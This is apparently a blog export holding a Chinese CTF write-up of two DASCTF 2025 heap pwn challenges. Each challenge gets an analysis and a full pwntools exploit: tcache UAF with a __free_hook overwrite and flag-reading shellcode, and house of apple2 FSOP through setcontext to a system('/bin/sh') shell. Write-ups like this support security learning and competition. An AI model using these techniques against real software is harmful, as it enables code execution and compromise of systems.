{"meta":{"title":"zzzz","subtitle":"","description":"","author":"John Doe","url":"https://z-z27.github.io","root":"/"},"pages":[],"posts":[{"title":"Dasctf-2025-下半年(pwn 部分解)","slug":"dasctf","date":"2025-12-10T15:00:00.000Z","updated":"2025-12-11T15:52:04.960Z","comments":true,"path":"2025/12/10/dasctf/","permalink":"https://z-z27.github.io/2025/12/10/dasctf/","excerpt":"","text":"Dasctf-2025-下半年rcms分析：checksec一下什么保护都开了，有简陋沙箱，可以打orw，使用IDA打开 有很明显的UAF 同时还有gift这个后面函数，只要使得程序的执行流执行到这里便可以传入shellcode，获得flag。 进行尝试，发现libc版本对应2.27从docker上取下来，glibc2.27条件下tcache基本没有保护 然后先填充满tcache，利用unsortedbin泄露libc_base。 再泄露heap，利用tcache泄露gift地址 再修改free_hook地址为gift地址即可进入后面函数，即可注入shellcode 利用：泄露libc_base: 123456789101112add(7,0x400,b&#x27;a&#x27;)add(8,0x20,b&#x27;a&#x27;)for i in range(7): free(i)free(7)show(7)io.recv()addr1 = u64(io.recvuntil(b&#x27;\\n&#x27;,drop = True).ljust(8,b&#x27;\\x00&#x27;))print(&quot;addr1:&quot;,hex(addr1))libc_base = addr1 - 0x3ebca0print(&quot;libc_base:&quot;,hex(libc_base))#libc_base 泄露heap,gift地址 1234567891011121314151617show(2)io.recv()addr2 = u64(io.recvuntil(b&#x27;\\n&#x27;,drop = True).ljust(8,b&#x27;\\x00&#x27;))print(&quot;addr2:&quot;,hex(addr2))heap = addr2 - 0x16b0print(&quot;heap:&quot;,hex(heap))#heap_addradd(9,0x20,b&#x27;a&#x27;)free(9)edit(9,p64(heap +0x250))add(10,0x20,b&#x27;a&#x27;)add(11,0x20,b&#x27;a&#x27;*0x10)show(11)io.recvuntil(b&#x27;a&#x27;*0x10)addr3 = u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))print(&quot;addr3:&quot;,hex(addr3)) 利用__free_hook控制执行流，注入shellcode 1234567891011121314151617181920212223242526272829add(12,0x70,b&#x27;a&#x27;)free(12)edit(12,p64(libc_base + libc.sym[&quot;__free_hook&quot;]))add(13,0x70,b&#x27;a&#x27;)add(14,0x70,p64(addr3))free(14)shellcode = &quot;&quot;&quot;push 0x67616c66mov rdi,rspxor esi,esipush 2pop raxsyscallmov rdi,raxmov rsi,rspmov edx,0x100xor eax,eaxsyscallmov edi,1mov rsi,rsppush 1pop raxsyscall&quot;&quot;&quot;io.recvuntil(b&#x27;what are u want say to me?&#x27;)io.send(asm(shellcode))#gdb.attach(io)io.interactive() Exp:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102from pwn import *context.arch = &#x27;amd64&#x27; #io = process(&quot;./pwn&quot;)io = remote(&quot;node5.buuoj.cn&quot;,26098)libc = ELF(&quot;./libc.so.6&quot;)#context.log_level = &#x27;debug&#x27;def add(x,y,z): io.recvuntil(b&#x27;5.exit&#x27;) io.sendline(b&#x27;1&#x27;) io.recvuntil(b&#x27;which one do u want to connect:&#x27;) io.sendline(str(x)) io.recvuntil(b&#x27;how much time do u want:&#x27;) io.sendline(str(y)) io.recvuntil(b&#x27;plz input cmd:&#x27;) io.send(z)def free(x): io.recvuntil(b&#x27;5.exit&#x27;) io.sendline(b&#x27;2&#x27;) io.recvuntil(b&#x27;which connection do u want to delet:&#x27;) io.sendline(str(x))def show(x): io.recvuntil(b&#x27;5.exit&#x27;) io.sendline(b&#x27;4&#x27;) io.recvuntil(b&#x27;which connection do u want to show:&#x27;) io.sendline(str(x))def edit(x,y): io.recvuntil(b&#x27;5.exit&#x27;) io.sendline(b&#x27;3&#x27;) io.recvuntil(b&#x27;which connection do u want to change:&#x27;) io.sendline(str(x)) io.recvuntil(b&#x27;plz input ur cmd:&#x27;) io.send(y)for i in range(7): add(i,0x400,b&#x27;a&#x27;)add(7,0x400,b&#x27;a&#x27;)add(8,0x20,b&#x27;a&#x27;)for i in range(7): free(i)free(7)show(7)io.recv()addr1 = u64(io.recvuntil(b&#x27;\\n&#x27;,drop = True).ljust(8,b&#x27;\\x00&#x27;))print(&quot;addr1:&quot;,hex(addr1))libc_base = addr1 - 0x3ebca0print(&quot;libc_base:&quot;,hex(libc_base))#libc_baseshow(2)io.recv()addr2 = u64(io.recvuntil(b&#x27;\\n&#x27;,drop = True).ljust(8,b&#x27;\\x00&#x27;))print(&quot;addr2:&quot;,hex(addr2))heap = addr2 - 0x16b0print(&quot;heap:&quot;,hex(heap))#heap_addradd(9,0x20,b&#x27;a&#x27;)free(9)edit(9,p64(heap +0x250))add(10,0x20,b&#x27;a&#x27;)add(11,0x20,b&#x27;a&#x27;*0x10)show(11)io.recvuntil(b&#x27;a&#x27;*0x10)addr3 = u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))print(&quot;addr3:&quot;,hex(addr3))add(12,0x70,b&#x27;a&#x27;)free(12)edit(12,p64(libc_base + libc.sym[&quot;__free_hook&quot;]))add(13,0x70,b&#x27;a&#x27;)add(14,0x70,p64(addr3))free(14)shellcode = &quot;&quot;&quot;push 0x67616c66mov rdi,rspxor esi,esipush 2pop raxsyscallmov rdi,raxmov rsi,rspmov edx,0x100xor eax,eaxsyscallmov edi,1mov rsi,rsppush 1pop raxsyscall&quot;&quot;&quot;io.recvuntil(b&#x27;what are u want say to me?&#x27;)io.send(asm(shellcode))#gdb.attach(io)io.interactive() CV_Manager比赛时没注意到有UAF，是赛后复现的 分析：先checksec一下，什么保护都开了，使用IDA打开 在case5的情况下有沙箱，而且非常严重，很难利用。 login登录只需要随便逆向一下就行。 在add的时候会申请了一个chunk，然后在一个地方储存name，然后在edit的时候 会向chunk里面写入东西。 delete里面没有UAF，show可以正常使用。 在gift里面有个free但却没有置0，有UAF 所以可以选择先填充满tcache并将一个chunk放到unsorted bin里面，然后将其重新申请回来，这样利用show就可以泄露libc_base,heap地址 然后利用UAF修改指针，起到任意写的效果，选择修改stdout，利用puts去触发house of apple2，即可控制执行流，并且不经过沙箱 利用：先泄露heap和libc_base: 123456789101112131415161718192021222324for i in range(8): add(0x110,b&#x27;CCTTFFEERR!!&#x27;)add(0x100,b&#x27;a&#x27;) # 8for i in range(8): free(i)for i in range(7): add(0x110,b&#x27;a&#x27;)add(0x100,b&#x27;a&#x27;)show(6)io.recv()io.recvuntil(b&#x27;introduction:&#x27;)addr1 = u64(io.recv(8))print(&quot;addr1:&quot;,hex(addr1))heap = addr1 * 0x1000print(&quot;heap:&quot;,hex(heap))show(7)io.recv()io.recvuntil(b&#x27;introduction:&#x27;)addr2 = u64(io.recv(8))print(&quot;addr2:&quot;,hex(addr2))libc_base = addr2 -0x21adf0print(&quot;libc_base:&quot;,hex(libc_base)) 随后利用gift函数利用UAF，将stdout添加到tcache链上 123456789add(0x200,b&#x27;CCTTFFEERR!!&#x27;) # 9add(0x200,b&#x27;a&#x27;) # 10free(10)gift(9)io.recv()addr3 = u64(io.recv(8)) - 0x5270print(&quot;addr3:&quot;,hex(addr3))edit(9,p64(addr1 ^ (libc_base + libc.sym[&quot;_IO_2_1_stdout_&quot;]))) 随后对stdout进行编辑，因为是通过puts进行触发，所有对检查更加严格 调用流程：puts-&gt; _Io_wfile_xsputn-&gt; _IO_wdefault_xsputn -&gt; _IO_wfile_overflow -&gt; _IO_wdoallocbuf 从而触发setcontrext + 61，然后利用read向rsp后续部分输入system 123456789101112131415161718192021222324252627282930313233add(0x200,b&#x27;a&#x27;) # 10add(0x200,b&#x27;a&#x27;) # 11print(&quot;tiaoshi&quot;,hex(libc_base + libc.sym[&quot;setcontext&quot;] + 61))gdb.attach(io)system = libc_base + libc.sym[&#x27;system&#x27;]binsh = libc_base + next(libc.search(b&#x27;/bin/sh\\x00&#x27;))pop_rdi = libc_base + 0x000000000002a3e5 setcontext = libc_base + libc.sym[&#x27;setcontext&#x27;]_IO_wfile_jumps = libc_base + libc.sym[&#x27;_IO_wfile_jumps&#x27;]fake_addr = libc_base + libc.sym[&#x27;_IO_2_1_stdout_&#x27;]print(&quot;fkae_addr:&quot;,hex(fake_addr))payload = flat(&#123; 0x20: p64(libc_base + libc.sym[&quot;read&quot;]), 0x50: p64(0), 0x58: p64(fake_addr + 0x28), 0x70: p64(0x100), 0x88: p64(fake_addr + 0x28), 0xa0: p64(fake_addr - 0x18), 0x90: p64(libc_base + libc.sym[&quot;read&quot;]), 0xc8: p64(fake_addr + 0x68), 0xd0: p64(setcontext + 61), 0xd8: p64(_IO_wfile_jumps),&#125;, filler=b&#x27;\\x00&#x27;)ret = libc_base + 0x0000000000029139edit(11,payload) 输入system(“&#x2F;bin&#x2F;sh”)获得shell 12io.sendline( p64(pop_rdi) + p64(binsh) +p64(ret)+ p64(system))io.interactive() Exp:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119from pwn import *io = process(&quot;./pwn&quot;)libc= ELF(&quot;./libc.so.6&quot;)#context.log_level = &#x27;debug&#x27;io.recvuntil(b&#x27;username:&#x27;)io.sendline(b&#x27;r00t&#x27;)io.recvuntil(b&#x27;password:&#x27;)io.sendline(b&#x27;p9s3w0r6&#x27;)def add(x,y): io.recvuntil(b&#x27;Your choice:&#x27;) io.sendline(b&#x27;1&#x27;) io.recvuntil(b&#x27;Introduction length:&#x27;) io.sendline(str(x)) io.recvuntil(b&#x27;your name:&#x27;) io.send(y)def edit(x,y): io.recvuntil(b&#x27;Your choice:&#x27;) io.sendline(b&#x27;2&#x27;) io.recvuntil(b&#x27;Which CV do you want to modify:&#x27;) io.sendline(str(x)) io.recvuntil(b&#x27;Please briefly introduce yourself:&#x27;) io.send(y)def free(x): io.recvuntil(b&#x27;Your choice:&#x27;) io.sendline(b&#x27;3&#x27;) io.recvuntil(b&#x27;Which CV do you want to remove:&#x27;) io.sendline(str(x))def show(x): io.recvuntil(b&#x27;Your choice:&#x27;) io.sendline(b&#x27;4&#x27;) io.recvuntil(b&#x27;Which CV do you want to view:&#x27;) io.sendline(str(x))def gift(x): io.recvuntil(b&#x27;Your choice:&#x27;) io.sendline(b&#x27;666&#x27;) io.recvuntil(b&#x27;index:&#x27;) io.sendline(str(x))for i in range(8): add(0x110,b&#x27;CCTTFFEERR!!&#x27;)add(0x100,b&#x27;a&#x27;) # 8for i in range(8): free(i)for i in range(7): add(0x110,b&#x27;a&#x27;)add(0x100,b&#x27;a&#x27;)show(6)io.recv()io.recvuntil(b&#x27;introduction:&#x27;)addr1 = u64(io.recv(8))print(&quot;addr1:&quot;,hex(addr1))heap = addr1 * 0x1000print(&quot;heap:&quot;,hex(heap))show(7)io.recv()io.recvuntil(b&#x27;introduction:&#x27;)addr2 = u64(io.recv(8))print(&quot;addr2:&quot;,hex(addr2))libc_base = addr2 -0x21adf0print(&quot;libc_base:&quot;,hex(libc_base))add(0x200,b&#x27;CCTTFFEERR!!&#x27;) # 9add(0x200,b&#x27;a&#x27;) # 10free(10)gift(9)io.recv()addr3 = u64(io.recv(8)) - 0x5270print(&quot;addr3:&quot;,hex(addr3))edit(9,p64(addr1 ^ (libc_base + libc.sym[&quot;_IO_2_1_stdout_&quot;])))#gdb.attach(io)add(0x200,b&#x27;a&#x27;) # 10add(0x200,b&#x27;a&#x27;) # 11print(&quot;tiaoshi&quot;,hex(libc_base + libc.sym[&quot;setcontext&quot;] + 61))gdb.attach(io)system = libc_base + libc.sym[&#x27;system&#x27;]binsh = libc_base + next(libc.search(b&#x27;/bin/sh\\x00&#x27;))pop_rdi = libc_base + 0x000000000002a3e5 setcontext = libc_base + libc.sym[&#x27;setcontext&#x27;]_IO_wfile_jumps = libc_base + libc.sym[&#x27;_IO_wfile_jumps&#x27;]fake_addr = libc_base + libc.sym[&#x27;_IO_2_1_stdout_&#x27;]print(&quot;fkae_addr:&quot;,hex(fake_addr))payload = flat(&#123; 0x20: p64(libc_base + libc.sym[&quot;read&quot;]), 0x50: p64(0), 0x58: p64(fake_addr + 0x28), 0x70: p64(0x100), 0x88: p64(fake_addr + 0x28), 0xa0: p64(fake_addr - 0x18), 0x90: p64(libc_base + libc.sym[&quot;read&quot;]), 0xc8: p64(fake_addr + 0x68), 0xd0: p64(setcontext + 61), 0xd8: p64(_IO_wfile_jumps),&#125;, filler=b&#x27;\\x00&#x27;)ret = libc_base + 0x0000000000029139edit(11,payload)io.sendline( p64(pop_rdi) + p64(binsh) +p64(ret)+ p64(system))io.interactive()","categories":[{"name":"pwn","slug":"pwn","permalink":"https://z-z27.github.io/categories/pwn/"}],"tags":[{"name":"堆","slug":"堆","permalink":"https://z-z27.github.io/tags/%E5%A0%86/"}],"author":"zzzz"}],"categories":[{"name":"pwn","slug":"pwn","permalink":"https://z-z27.github.io/categories/pwn/"}],"tags":[{"name":"堆","slug":"堆","permalink":"https://z-z27.github.io/tags/%E5%A0%86/"}]}